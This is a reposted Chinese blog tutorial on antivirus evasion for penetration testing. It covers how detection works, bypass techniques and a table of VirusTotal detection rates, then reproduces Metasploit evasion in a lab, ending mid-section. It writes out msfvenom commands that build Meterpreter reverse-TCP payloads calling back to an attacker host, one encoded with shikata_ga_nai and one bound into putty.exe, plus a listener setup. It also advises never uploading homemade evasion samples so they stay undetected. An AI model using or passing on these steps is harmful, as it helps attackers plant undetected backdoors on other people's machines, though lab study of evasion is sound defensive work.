class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">转载</a><span class="article-meta tags"><a class="article-meta__tags" href="/tags/%E6%94%BB%E9%98%B2%E7%9F%A5%E8%AF%86/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>攻防知识</span></a></span></div></div><h1 class="post-title" itemprop="name headline">内网渗透-免杀</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2025-03-20T02:41:30.000Z" title="发表于 2025-03-20 02:41:30">2025-03-20</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2025-03-20T15:17:54.131Z" title="更新于 2025-03-20 15:17:54">2025-03-20</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="内网渗透-免杀"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为长沙"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>长沙</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="https://img1.baidu.com/it/u=877727430,37580436&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=500&amp;h=667"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://example.com/smallhao/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%85%8D%E6%9D%80/"><header><a href="/tags/%E6%94%BB%E9%98%B2%E7%9F%A5%E8%AF%86/" tabindex="-1" itemprop="url">攻防知识</a><h1 id="CrawlerTitle" itemprop="name headline">内网渗透-免杀</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">转载</span><time itemprop="dateCreated datePublished" datetime="2025-03-20T02:41:30.000Z" title="发表于 2025-03-20 02:41:30">2025-03-20</time><time itemprop="dateCreated datePublished" datetime="2025-03-20T15:17:54.131Z" title="更新于 2025-03-20 15:17:54">2025-03-20</time></header><h1 id="内网渗透-免杀"><a href="#内网渗透-免杀" class="headerlink" title="内网渗透-免杀"></a>内网渗透-免杀</h1><h2 id="杀软原理"><a href="#杀软原理" class="headerlink" title="杀软原理"></a>杀软原理</h2><p>可执行文件存在的两种状态及检测方式：</p>
<ul>
<li>未执行时在硬盘上的状态（静态检测）</li>
<li>执行后加载进内存的状态（动态监测）</li>
</ul>
<p>杀软的基本等级：</p>
<ul>
<li>无害：无任何可疑行为，无任何特征命中病毒特征</li>
<li>可疑：存在可疑行为，例如操作注册表、打开Powershell、修改用户、操作敏感文件等</li>
<li>有害：特征命中病毒特征</li>
</ul>
<h3 id="静态检测"><a href="#静态检测" class="headerlink" title="静态检测"></a>静态检测</h3><p>静态检测是在不实际运行程序的情况下进行的分析，大部分的静态检测对象是针对特定版本的源代码，也有些静态程序分析的对象是目标代码。</p>
<p>静态检测针对样本文件在硬盘上的状态进行检测：</p>
<ul>
<li>样本Hash检测：此类检测会对文件整体以及各个节段进行Hash计算，而后对比是否存在于特征病毒库中，这是最早期的检测方法。对于Hash检测，在源码中修改一下变量名，或在编译完成之后，通过二进制查看器修改某一不重要的字节码，即可改变整个文件的Hash。</li>
<li>特征码检测：由于样本Hash检测的缺点，特征码会提取文件中部分关键字节码作为特征进行检测，字节码可以是硬编码的IP、域名、互斥体名称、加密秘钥或部分关键流程代码。杀软会扫描存在磁盘上的镜像文件，如果满足特征码，就识别为恶意软件。</li>
<li>黑白名单检测：对于一些系统进程或是杀软进程可能会默认加白，这样即便有些恶意行为，也不会被查杀。</li>
</ul>
<p>通常静态检测会识别代码中存在的函数：</p>
<ul>
<li>Windows API函数：尤其是与内存、堆、线程相关的函数，例如virualalloc、rtlmovememory、ntcreatthread等。</li>
<li>编程语言关键词：cmd等关键词，例如Python中的subprocess.popen(“cmd &#x2F;c”)</li>
</ul>
<p>常见的绕过思路：</p>
<ul>
<li>绕过静态检测的方式通常有多次加密、内存加载执行、加壳改壳、添加&#x2F;替换资源、加密Shellcode等</li>
</ul>
<p>常用的静态检测平台：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.virustotal.com/%EF%BC%8C%E6%B3%A8%E6%84%8F%EF%BC%9AVirustotal%E6%98%AF%E5%9B%BD%E5%A4%96%E5%B9%B3%E5%8F%B0%EF%BC%8C%E8%AF%B7%E8%B0%A8%E6%85%8E%E6%93%8D%E4%BD%9C%EF%BC%8C%E6%9C%80%E5%A5%BD%E4%B8%8D%E8%A6%81%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%EF%BC%8C%E5%BB%BA%E8%AE%AE%E4%BB%85%E6%A0%A1%E9%AA%8C%E5%B9%B6%E6%A3%80%E6%9F%A5MD5%E6%98%AF%E5%90%A6%E4%B8%BA%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E3%80%82">https://www.virustotal.com/，注意：Virustotal是国外平台，请谨慎操作，最好不要直接上传文件，建议仅校验并检查MD5是否为恶意文件。</a></li>
</ul>
<h3 id="动态检测"><a href="#动态检测" class="headerlink" title="动态检测"></a>动态检测</h3><p>动态检测针对样本文件内存中的状态进行检测：</p>
<ul>
<li>内存特征码检测：对于静态文件特征码来说，可以将shellcode做多次加密，完全抹掉其原本特征，降低杀软的报毒率。但是当进入内存需要执行代码时，shellcode需要完全解密，这时候杀软只需要遍历内存，根据特征码进行查杀即可。</li>
<li>敏感API检测（HOOK）：在关键的入口或道路进行监控，如果单次或多次触发警告，比如读取并修改了其他进程的内存，或在其他进程中开了个远程线程将触发告警。对于不同杀软的不同策略，将根据调用顺序、调用源、参数判断是否是正常调用。</li>
<li>敏感行为检测：实现一个功能，不一定非要用某一个固定的接口，因此，实现一个读写内存操作，单检测一个API是无效的。此时，只要对象触发了某种行为，在其他进程中开了线程，那么就判定为恶意行为。常见的病毒恶意行为：<ul>
<li>注册表操作：添加启动项、添加服务。</li>
<li>文件操作：写入文件、读取系统文件、删除文件、移动文件。</li>
<li>进程操作：杀死进程、创建进程。</li>
<li>用户操作：添加用户、删除用户、删除用户。</li>
<li>其他操作：注入、劫持等。</li>
</ul>
</li>
</ul>
<p>常见的绕过思路：</p>
<ul>
<li>绕过动态检测的方式通常是白名单调用敏感行为，再导入恶意内容</li>
</ul>
<p>常用的动态检测平台：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://s.threatbook.cn/">https://s.threatbook.cn/</a></li>
</ul>
<h3 id="流量检测"><a href="#流量检测" class="headerlink" title="流量检测"></a>流量检测</h3><p>流量检测针对恶意程序在网络通讯流量层面上的状态进行检测：</p>
<ul>
<li>结构特征：此类特征一般是指已知远控的恶意程序心跳包，比如CS beacon心跳包特征，会按照攻击者设置的频率发送固定结构固定内容的数据包以证明存活。</li>
<li>内容特征：此类特征一般是指各类漏洞的exp流量包特征、冰蝎、哥斯拉等流量特征，对于此类流量可以编写流量规则进行过滤检测，比如suricata规则、wireshark规则等。</li>
<li>IP&#x2F;域名&#x2F;证书匹配：对于数据包中的ip域名等信息，链接威胁情报平台查询是否存在恶意行为，比如扫描、用作C2回连或网站挂马等，对于此类流量可以选择弹窗告警或直接阻断。</li>
</ul>
<p>常见的绕过思路：</p>
<ul>
<li>绕过流量检测的方式通常有TCP分段传输、内容加密、使用合法证书等</li>
</ul>
<h3 id="云查杀"><a href="#云查杀" class="headerlink" title="云查杀"></a>云查杀</h3><p>云查杀的不同点在于它的病毒库是放在服务器端的，而不是本地客户端，只要联网，病毒库就会同步更新，病毒库更加强大。</p>
<p>当开着杀软的云查杀的时候，有时候刚开始没报病毒，但过一会就提示病毒了。</p>
<h2 id="免杀原理"><a href="#免杀原理" class="headerlink" title="免杀原理"></a>免杀原理</h2><h3 id="静态免杀"><a href="#静态免杀" class="headerlink" title="静态免杀"></a>静态免杀</h3><h4 id="修改特征码"><a href="#修改特征码" class="headerlink" title="修改特征码"></a>修改特征码</h4><p>特征码是能够识别一个程序的不大于64字节的字符。</p>
<p>修改特征码是在不改变程序运行效果的前提下，更改其特征码。</p>
<p>修改特征码最重要的是定位特征码，但是定位了特征码修改后并不代表程序就能正常运行，费时费力，由于各个杀软厂商的特征库不同，所以一般也只能对一类的杀软起效果。虽然效果不好，但有时候在没有源码的情况下可以一用。</p>
<h4 id="花指令免杀"><a href="#花指令免杀" class="headerlink" title="花指令免杀"></a>花指令免杀</h4><p>花指令其实就是一段毫无意义的指令，也可以称之为垃圾指令。花指令是否存在对程序的执行结果没有影响，所以它存在的唯一目的就是阻止反汇编程序，或对反汇编设置障碍。</p>
<p>为一个程序添加一段花指令之后，程序的部分偏移会受到影响，如果反病毒软件不能识别这段花指令，那么它检测特征码的偏移量会整体位移一段位置，也就无法正常检测木马了。</p>
<h4 id="加壳免杀"><a href="#加壳免杀" class="headerlink" title="加壳免杀"></a>加壳免杀</h4><p>软件加壳其实也可以称为软件加密（或软件压缩），只是加密（或压缩）的方式与目的不一样。壳就是软件所增加的保护，并不会破坏里面的程序结构，当我们运行这个加壳的程序时，系统首先会运行程序里的壳，然后由壳将加密的程序逐步还原到内存中，最后运行程序。</p>
<p>加壳能够掩盖特征码，特别是对于不开源的PE文件，加壳可以绕过很多特征码识别。但是壳也有自己的特征，主流的壳例如VMP、Themida等，被检测出将直接报毒。</p>
<p>可以用一些冷门的加密壳，或基于开源压缩壳做二次开发。</p>
<p>加壳工具：</p>
<ul>
<li>ASPack</li>
<li>UPX</li>
</ul>
<h3 id="动态免杀"><a href="#动态免杀" class="headerlink" title="动态免杀"></a>动态免杀</h3><h4 id="API免杀"><a href="#API免杀" class="headerlink" title="API免杀"></a>API免杀</h4><ul>
<li><p>替换API：杀软不可能拦截所有API，可以使用相同功能的API进行替换，例如<code>MoveFileEx</code>替换<code>MoveFile</code>。</p>
</li>
<li><p>重写API：逆向后完全重写系统API功能，实现对应功能的API。</p>
</li>
<li><p>底层API：寻找更底层的API进行调用，绕过拦截，例如NT函数。或者通过DeviceloControl函数调用驱动功能来完成API功能，模拟系统调用。</p>
</li>
</ul>
<h4 id="内存免杀"><a href="#内存免杀" class="headerlink" title="内存免杀"></a>内存免杀</h4><p>在执行外壳代码时，要先将原软件解密，并放到内存里，然后再通知CPU执行。加壳时，需要加一个混淆程序原有代码的壳，才能躲过杀软查杀。</p>
<h4 id="二次编译"><a href="#二次编译" class="headerlink" title="二次编译"></a>二次编译</h4><p>Metasploit的Msfvenom提供了多种格式的Payload和Encoder，生成的Shellcode也为二次加工提供了很大便利。</p>
<p>Shikata_ga_nai是MSF中唯一的评价是excellent的编码器，这种多态编码技术使得每次生成的攻击载荷文件是不一样的，编码和解码也都是不一样的，还可以利用管道进行多重编码进行免杀。</p>
<p>目前Msfvenom的Encoder特征基本都进入了杀软的漏洞库，很难实现单一Encoder编码而绕过杀软，所以对Shellcode进行进一步修改编译成了MSF免杀的主流。有很多借助于C、C#、python等语言对Shellcode进行二次编码从而达到免杀的效果。</p>
<h4 id="分离免杀"><a href="#分离免杀" class="headerlink" title="分离免杀"></a>分离免杀</h4><p>例如Payload分离免杀和Webshell分离免杀，将Shellcode和加载器分离，实现简单，但效果不错。</p>
<h4 id="资源修改"><a href="#资源修改" class="headerlink" title="资源修改"></a>资源修改</h4><p>有些杀软会设置有扫描白名单，比如之前把程序图标替换为360安全卫士图标就能过360的查杀。</p>
<ul>
<li>添加资源：使用ResHacker将正常软件的资源加入到恶意软件，例如图片、版本信息、对话框等</li>
<li>替换资源：使用ResHacker替换无用的资源，例如版本等</li>
<li>添加签名：使用签名伪造工具，将正常软件的签名信息添加到恶意软件</li>
</ul>
<h1 id="免杀技术研究"><a href="#免杀技术研究" class="headerlink" title="免杀技术研究"></a>免杀技术研究</h1><h2 id="Bypass一览表（2020年）"><a href="#Bypass一览表（2020年）" class="headerlink" title="Bypass一览表（2020年）"></a>Bypass一览表（2020年）</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205261702163.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205261701678.png"></p>
<h2 id="Bypass一览表（2022年）"><a href="#Bypass一览表（2022年）" class="headerlink" title="Bypass一览表（2022年）"></a>Bypass一览表（2022年）</h2><p>VirusTotal对应杀软及名称：</p>
<ul>
<li>卡巴：Kaspersky</li>
<li>微软：Microsoft</li>
<li>瑞星：Rising</li>
<li>金山：Kingsoft</li>
<li>江民：Jiangmin</li>
<li>趋势：TrendMicro</li>
</ul>
<table>
<thead>
<tr>
<th>序号</th>
<th>免杀方法</th>
<th>2020年VT</th>
<th>2022年VT</th>
<th>360</th>
<th>QQ</th>
<th>火绒</th>
<th>卡巴</th>
<th>McAfee</th>
<th>微软</th>
<th>Symantec</th>
<th>瑞星</th>
<th>金山</th>
<th>江民</th>
<th>趋势</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>未免杀处理</td>
<td>53&#x2F;69</td>
<td>51&#x2F;69</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>√</td>
<td>√</td>
<td></td>
</tr>
<tr>
<td>2</td>
<td>msf自编码</td>
<td>51&#x2F;69</td>
<td>48&#x2F;67</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>√</td>
<td>√</td>
<td></td>
</tr>
<tr>
<td>3</td>
<td>msf自捆绑</td>
<td>39&#x2F;69</td>
<td>15&#x2F;69</td>
<td></td>
<td>√</td>
<td>√</td>
<td>√</td>
<td></td>
<td>√</td>
<td>√</td>
<td></td>
<td>√</td>
<td>√</td>
<td>√</td>
</tr>
<tr>
<td>4</td>
<td>msf捆绑+编码</td>
<td>35&#x2F;68</td>
<td>16&#x2F;69</td>
<td></td>
<td>√</td>
<td>√</td>
<td>√</td>
<td></td>
<td>√</td>
<td>√</td>
<td></td>
<td>√</td>
<td>√</td>
<td>√</td>
</tr>
<tr>
<td>5</td>
<td>msf多重编码</td>
<td>45&#x2F;70</td>
<td>28&#x2F;67</td>
<td></td>
<td>√</td>
<td>√</td>
<td></td>
<td>√</td>
<td>√</td>
<td>√</td>
<td></td>
<td>√</td>
<td>√</td>
<td>√</td>
</tr>
<tr>
<td>6</td>
<td>Evasion模块exe</td>
<td>42&#x2F;71</td>
<td>43&#x2F;69</td>
<td></td>
<td>√</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>√</td>
<td>√</td>
<td>√</td>
</tr>
<tr>
<td>7</td>
<td>Evasion模块hta</td>
<td>14&#x2F;59</td>
<td>（None）</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>8</td>
<td>Evasion模块csc</td>
<td>12&#x2F;71</td>
<td>33&#x2F;69</td>
<td></td>
<td>√</td>
<td></td>
<td>√</td>
<td></td>
<td></td>
<td>√</td>
<td></td>
<td>√</td>
<td>√</td>
<td>√</td>
</tr>
<tr>
<td>9</td>
<td>Veil原生exe</td>
<td>44&#x2F;71</td>
<td>44&#x2F;69</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>√</td>
<td></td>
<td>√</td>
</tr>
<tr>
<td>10</td>
<td>Veil+gcc编译</td>
<td>23&#x2F;71</td>
<td>11&#x2F;69</td>
<td></td>
<td>√</td>
<td></td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
</tr>
<tr>
<td>11</td>
<td>Venom生成exe</td>
<td>19&#x2F;71</td>
<td>35&#x2F;68</td>
<td></td>
<td>√</td>
<td></td>
<td></td>
<td></td>
<td>√</td>
<td></td>
<td></td>
<td>√</td>
<td></td>
<td>√</td>
</tr>
<tr>
<td>12</td>
<td>Venom生成dll</td>
<td>11&#x2F;71</td>
<td>（None）</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>13</td>
<td>Shellter生成exe</td>
<td>7&#x2F;69</td>
<td>12&#x2F;65</td>
<td></td>
<td>√</td>
<td></td>
<td>√</td>
<td>√</td>
<td></td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
</tr>
<tr>
<td>14</td>
<td>msf生成exe</td>
<td>-</td>
<td>51&#x2F;69</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>√</td>
<td>√</td>
<td></td>
</tr>
<tr>
<td>15</td>
<td>C&#x2F;C++2：动态内存</td>
<td>24&#x2F;71</td>
<td>36&#x2F;69</td>
<td></td>
<td>√</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>√</td>
<td></td>
<td>√</td>
</tr>
<tr>
<td>16</td>
<td>C&#x2F;C++3：嵌入汇编</td>
<td>12&#x2F;71</td>
<td>36&#x2F;69</td>
<td></td>
<td>√</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>√</td>
<td></td>
<td>√</td>
</tr>
<tr>
<td>17</td>
<td>C&#x2F;C++4：强制转换</td>
<td>9&#x2F;70</td>
<td>34&#x2F;68</td>
<td></td>
<td>√</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>√</td>
<td></td>
<td>√</td>
</tr>
<tr>
<td>18</td>
<td>C&#x2F;C++5：汇编花指令</td>
<td>12&#x2F;69</td>
<td>37&#x2F;69</td>
<td>√</td>
<td>√</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>√</td>
<td></td>
<td>√</td>
</tr>
<tr>
<td>19</td>
<td>C&#x2F;C++6：XOR加密</td>
<td>15&#x2F;71</td>
<td>21&#x2F;69</td>
<td></td>
<td>√</td>
<td></td>
<td></td>
<td></td>
<td>√</td>
<td></td>
<td></td>
<td>√</td>
<td></td>
<td>√</td>
</tr>
<tr>
<td>20</td>
<td>C&#x2F;C++7：base64加密1</td>
<td>28&#x2F;69</td>
<td>21&#x2F;68</td>
<td>√</td>
<td>√</td>
<td></td>
<td>√</td>
<td></td>
<td>√</td>
<td></td>
<td></td>
<td>√</td>
<td>√</td>
<td>√</td>
</tr>
<tr>
<td>21</td>
<td>C&#x2F;C++8：base64加密2</td>
<td>28&#x2F;69</td>
<td>17&#x2F;67</td>
<td>√</td>
<td>√</td>
<td></td>
<td>√</td>
<td></td>
<td>√</td>
<td></td>
<td></td>
<td>√</td>
<td>√</td>
<td>√</td>
</tr>
</tbody></table>
<h2 id="复现环境（2022年）"><a href="#复现环境（2022年）" class="headerlink" title="复现环境（2022年）"></a>复现环境（2022年）</h2><p>时间：2022.05</p>
<p>攻击机：192.168.174.128</p>
<p>免杀方法：</p>
<ul>
<li>此处仅介绍msf、Evasion、Veil、Venom、C&#x2F;C++ Shellcode，其余方法参见原po：<a target="_blank" rel="noopener" href="https://github.com/TideSec/BypassAntiVirus">https://github.com/TideSec/BypassAntiVirus</a></li>
</ul>
<p>原po各杀软版本：</p>
<ul>
<li>360杀毒版本5.0.0.8160(2019.12.12)</li>
<li>火绒版本5.0.33.13(2019.12.12)</li>
<li>360安全卫士12.0.0.2001(2019.12.17)</li>
</ul>
<p>本文各杀软版本：</p>
<ul>
<li>火绒版本5.0.68.2(2022.05.26)</li>
<li>360安全卫士13.0.0.2003(2022.05.26)</li>
</ul>
<p>测试平台：</p>
<ul>
<li>Virustotal，以下简称VT。VT查杀率代表静态查杀能力。</li>
</ul>
<p>【注意】</p>
<ul>
<li><p>如果是自己做免杀，建议测试机不要连互联网，更不要上传到virustotal.com类似的平台上。</p>
</li>
<li><p>不要上传！</p>
</li>
<li><p>不要上传！</p>
</li>
<li><p>不要上传！</p>
</li>
<li><p>上传一次以后，你自己辛辛苦苦写的免杀可能就不再免杀了。</p>
</li>
</ul>
<h2 id="Metasploit自带免杀"><a href="#Metasploit自带免杀" class="headerlink" title="Metasploit自带免杀"></a>Metasploit自带免杀</h2><p>Payload均使用MSF的windows&#x2F;meterperter&#x2F;reverse_tcp模块生成。</p>
<p>攻击机MSF监听6666端口：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploits/multi/handler</span><br><span class="line">msf6 exploit(multi/handler) &gt; set LHOST 192.168.174.128</span><br><span class="line">msf6 exploit(multi/handler) &gt; set LPORT 6666</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>

<h3 id="原生态payload-VT查杀率51-69"><a href="#原生态payload-VT查杀率51-69" class="headerlink" title="原生态payload(VT查杀率51&#x2F;69)"></a>原生态payload(VT查杀率51&#x2F;69)</h3><p>MSF生成原始payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.174.128 LPORT=6666 -f exe -o /mnt/hgfs/Share/payload1.exe</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205261904148.png" alt="image-20220526190423066"></p>
<p>360和火绒都能查杀。</p>
<p>在virustotal.com上查杀率为51&#x2F;69（原po为53&#x2F;69）。</p>
<p>360：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205261901055.png" alt="image-20220526190107987"></p>
<p>火绒：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205261905876.png" alt="image-20220526190513816"></p>
<p>VT查杀成功：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205261909679.png" alt="image-20220526190921570"></p>
<p>VT查杀失败：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205261909529.png" alt="image-20220526190959477"></p>
<h3 id="msf自编码免杀-VT查杀率48-67"><a href="#msf自编码免杀-VT查杀率48-67" class="headerlink" title="msf自编码免杀(VT查杀率48&#x2F;67)"></a>msf自编码免杀(VT查杀率48&#x2F;67)</h3><p>使用<code>msfvenom --list encoders</code>可查看所有编码器。</p>
<p>评级最高的两个encoder为cmd&#x2F;powershell_base64和x86&#x2F;shikata_ga_nai，其中x86&#x2F;shikata_ga_nai也是免杀中使用频率最高的一个编码器。</p>
<p>使用<code>x86/shikata_ga_nai</code>生成payload，参数<code>-i</code>为编码次数，使用<code>-b</code>参数去掉payload中的空字符：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.174.128 LPORT=6666 -e x86/shikata_ga_nai -b &quot;\x00&quot; -i 15  -f exe -o /mnt/hgfs/Share/payload2.exe</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205261913186.png" alt="image-20220526191328018"></p>
<p>由于shikata_ga_nai编码技术是多态的，也就是说每次生成的payload文件都不一样，有时生成的文件会被查杀，有时却不会。当然这个也和编码次数有一定关系，编码次数好像超过70次就经常生成出错，但是编码次数多并不代表免杀能力强。</p>
<p>360和火绒都能查杀。</p>
<p>在virustotal.com上查杀率为48&#x2F;67（原po为51&#x2F;69）。</p>
<p>360：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205261914178.png" alt="image-20220526191412121"></p>
<p>火绒：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205261915497.png" alt="image-20220526191549429"></p>
<p>VT查杀成功：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205261918483.png" alt="image-20220526191847382"></p>
<p>VT查杀失败：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205261918665.png" alt="image-20220526191857605"></p>
<h3 id="msf自捆绑免杀-VT查杀率15-69"><a href="#msf自捆绑免杀-VT查杀率15-69" class="headerlink" title="msf自捆绑免杀(VT查杀率15&#x2F;69)"></a>msf自捆绑免杀(VT查杀率15&#x2F;69)</h3><p>在生成payload时可以使用捆绑功能，使用msfvenom的<code>-x</code>参数可以指定一个自定义的可执行文件作为模板,并将payload嵌入其中，<code>-x</code>后面跟对应文件路径就可以。</p>
<p>这里使用一个正规的<code>putty.exe</code>作为被捆绑测试软件。</p>
<p>生成payload命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.174.128 LPORT=6666  -x putty.exe  -f exe -o /mnt/hgfs/Share/payload3.exe</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205261921270.png" alt="image-20220526192124189"></p>
<p>生成的两个文件对比，大小完全一样。能否免杀也和被捆绑exe有一定关系，可以选微软的一些工具作为模板exe程序。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205261922615.png" alt="image-20220526192251559"></p>
<p>360能查杀，火绒不能查杀。但是识别时间比前两种方法久一些（原po火绒也能查杀）。</p>
<p>在virustotal.com上查杀率为15&#x2F;69（原po为39&#x2F;69）。</p>
<p>360：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205261925172.png" alt="image-20220526192548112"></p>
<p>VT：</p>
